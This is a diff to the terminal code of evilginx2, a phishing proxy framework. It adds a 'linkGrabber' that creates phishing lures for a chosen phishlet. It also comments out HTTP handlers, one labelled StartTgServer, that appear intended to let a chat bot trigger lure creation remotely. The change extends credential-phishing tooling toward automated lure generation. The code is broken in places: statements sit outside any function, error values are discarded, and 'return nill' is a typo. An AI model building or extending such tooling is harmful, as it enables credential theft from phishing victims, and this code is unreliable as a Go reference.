@@ -11,7 +11,7 @@ import (
 	"io/ioutil"
 	"math/rand"
 	"net/url"
-	"net/http"
+	//"net/http"
 	"os"
 	"path/filepath"
 	"regexp"
@@ -19,6 +19,7 @@ import (
 	"strconv"
 	"strings"
 	"time"
+
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -29,28 +30,28 @@ import (
 
 )
 
-type BotRequest struct {
-	ChatID  int64  `json:"chat_id"`
-	Message string `json:"message"`
-}
-
-
-
-http.HandleFunc("/process", func(w http.ResponseWriter, r *http.Request) {
-	var req BotRequest
-	err := json.NewDecoder(r.Body).Decode(&req)
-	if err != nil {
-		http.Error(w, "Wrong type", http.StatusBadRequest)
-		return
-	}
-	responseMessage := fmt.Sprintf("message from chat %d: %s", req.ChatID, req.Message)
-
-	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(map[string]string{"response": responseMessage})
-})
-
-log.Println("Server started:8080")
-log.Fatal(http.ListenAndServe(":8080", nil))
+//type BotRequest struct {
+//	ChatID  int64  `json:"chat_id"`
+//	Message string `json:"message"`
+//}
+//
+//
+//
+//http.HandleFunc("/process", func(w http.ResponseWriter, r *http.Request) {
+//	var req BotRequest
+//	err := json.NewDecoder(r.Body).Decode(&req)
+//	if err != nil {
+//		http.Error(w, "Wrong type", http.StatusBadRequest)
+//		return
+//	}
+//	responseMessage := fmt.Sprintf("message from chat %d: %s", req.ChatID, req.Message)
+//
+//	w.Header().Set("Content-Type", "application/json")
+//	json.NewEncoder(w).Encode(map[string]string{"response": responseMessage})
+//})
+//
+//log.Println("Server started:8080")
+//log.Fatal(http.ListenAndServe(":8080", nil))
 
 
 
@@ -58,6 +59,40 @@ const (
 	DEFAULT_PROMPT = ": "
 	LAYER_TOP      = 1
 )
+
+type linkGrabber struct {
+	cfg	  *Config
+	crt_db	  *CertDb
+	db	  *database.Database
+}
+
+func NewLinkGrabber(cfg *Config, crt_db *CertDb, db *database.Database) (*linkGrabber, error){
+	
+	lg := &linkGrabber{
+		cfg:	  cfg,
+		crt_db:	  crt_db,
+		db:	  db,
+	}
+
+	return lg, nil
+}
+
+func (lg *linkGrabber) GrabLures(args []string) error {
+	_, err := lg.cfg.GetPhishlet(args[1])
+	if err != nil {
+		fmt.Errorf("Error creating file")
+	}
+
+	l := &Lure{
+		Path:     "/" + GenRandomString(8),
+		Phishlet: args[1],
+	}
+
+	lg.cfg.AddLure(args[1], l)
+	log.Info("created lure with ID: %d", len(lg.cfg.lures)-1)
+	return nil
+}
+
 
 type Terminal struct {
 	rl        *readline.Instance
@@ -1844,3 +1879,27 @@ func (t *Terminal) filterInput(r rune) (rune, bool) {
 	}
 	return r, true
 }
+
+
+//func handler(w http.ResponseWriter, r *http.Request) {
+//
+//	_, err := t.cfg.GetPhishlet(args[1])
+//	if err != nil {
+//		fmt.Errorf("Error creating file")
+//	}
+//	l := &Lure{
+//		Path:     "/" + GenRandomString(8),
+//		Phishlet: args[1],
+//	}
+//
+//	t.cfg.AddLure(args[1], l)
+//	log.Info("created lure with ID: %d", len(t.cfg.lures)-1)
+//	fmt.Fprintf(w, "Request received!")
+//	return nill
+//}
+//
+//func StartTgServer() {
+//    http.HandleFunc("/", handler)
+//    log.Info("Starting Go server on :8080...")
+//    log.Fatal(http.ListenAndServe(":8080", nil))
+//}
